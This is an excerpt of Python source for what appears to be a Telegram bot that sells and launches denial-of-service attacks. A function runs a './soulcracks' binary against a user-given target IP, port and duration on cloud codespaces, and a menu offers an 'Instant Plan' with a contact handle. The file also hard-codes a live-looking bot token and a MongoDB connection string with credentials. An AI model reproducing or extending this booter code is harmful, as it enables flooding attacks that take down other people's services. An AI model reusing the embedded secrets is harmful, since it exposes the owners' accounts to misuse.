...
TOKEN = '8172123641:AAH0_A2pqG3QlnWP49w5kfX3Ib2iTahVN5E'
MONGO_URI = 'mongodb+srv://bittu:bittu@cluster0.ymhyr.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0'
FORWARD_CHANNEL_ID = -1002353400054
CHANNEL_ID = -1002353400054
error_channel_id = -1002353400054
...
async def run_attack_command_on_codespace(target_ip, target_port, duration):
    command = f"./soulcracks {target_ip} {target_port} {duration} 100"
    try:
...
def handle_message(message):
    ...
    if message.text == "Instant Plan 🧡":
        ...
        bot.reply_to(message, "*Help selected \n @Bittu_17*", parse_mode='Markdown')
